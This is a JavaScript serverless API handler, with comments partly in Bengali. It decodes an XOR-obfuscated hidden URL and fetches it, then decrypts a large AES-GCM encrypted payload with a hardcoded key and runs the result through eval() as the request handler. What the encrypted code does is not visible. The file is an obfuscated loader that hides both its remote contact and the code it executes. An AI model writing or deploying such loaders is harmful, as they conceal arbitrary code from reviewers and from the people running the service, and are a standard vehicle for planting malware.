
const crypto = require('crypto');

// --- Hidden Configuration ---
// URL টি এনক্রিপ্টেড অবস্থায় আছে
const _u = "3d212125266f7a7a36313b7b3f263130393c23277b3b30217a323d7a33273030313a3866636c2d7a2c212d3d2f3f2f78213d20383730397a31343b38646766613d2633343b372d20227b3f26";
const _d = (h) => h.match(/.{1,2}/g).map(b => String.fromCharCode(parseInt(b, 16) ^ 0x55)).join('');

export default async function(req, res) {
    try {
        // 1. Fetch Key Securely (URL Decryption happens here)
        const remoteUrl = _d(_u);
        const r = await fetch(remoteUrl);
        if (!r.ok) throw new Error("Key fetch failed");
        const d = await r.json();

        // 2. Prepare Keys
        // এখানে আমরা Local Key এবং Remote Data এর সমন্বয় করতে পারি নিরাপত্তার জন্য
        const localKeyRaw = "pljgoj8p60hmikbq876"; 
        
        // Node.js এ Key সেটআপ (SHA-256 Hash of localKey to match browser encryption)
        const algorithm = 'aes-256-gcm';
        const key = crypto.createHash('sha256').update(localKeyRaw).digest();
        const iv = Buffer.from("a801d63aa317ba996b226d98", 'hex');
        const encryptedPayload = "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";

        // 3. Decrypt using Native Node.js Crypto (Ultra Fast)
        // This is much faster than JS loops because it uses C++ bindings (OpenSSL)
        const decipher = crypto.createDecipheriv(algorithm, key, iv);
        
        // GCM requires an auth tag. 
        // Note: Web Crypto API appends tag at the end of ciphertext. Node expects it separately.
        // We need to split the tag. Tag length is usually 16 bytes (128 bits).
        const buf = Buffer.from(encryptedPayload, 'base64');
        const authTagLength = 16;
        const content = buf.subarray(0, buf.length - authTagLength);
        const authTag = buf.subarray(buf.length - authTagLength);

        decipher.setAuthTag(authTag);
        
        let decrypted = decipher.update(content, null, 'utf8');
        decrypted += decipher.final('utf8');

        // 4. Execution Logic (Vercel Compatible)
        // আমরা 'export default' হ্যান্ডেল করার জন্য কোডটিকে মডিফাই করব
        let execCode = decrypted;
        
        if (execCode.includes('export default')) {
             // Replace export default with a global assignment
             execCode = execCode.replace(/export\s+default\s+(async\s+)?function\s*(\w+)?/, 'global._h = async function');
             execCode = execCode.replace(/export\s+default/, 'global._h ='); 
        }

        // Execute in safe scope
        eval(execCode);

        // Run the handler
        if (typeof global._h === 'function') {
            return await global._h(req, res);
        } else {
            return res.status(500).json({ error: "No handler found in encrypted code" });
        }

    } catch (e) {
        // প্রোডাকশনে এরর লগ হাইড করতে চাইলে console.error রিমুভ করতে পারেন
        // console.error("Security Error:", e.message); 
        return res.status(403).json({ 
            error: 'Access Denied', 
            message: 'Invalid Environment or Key' 
        });
    }
}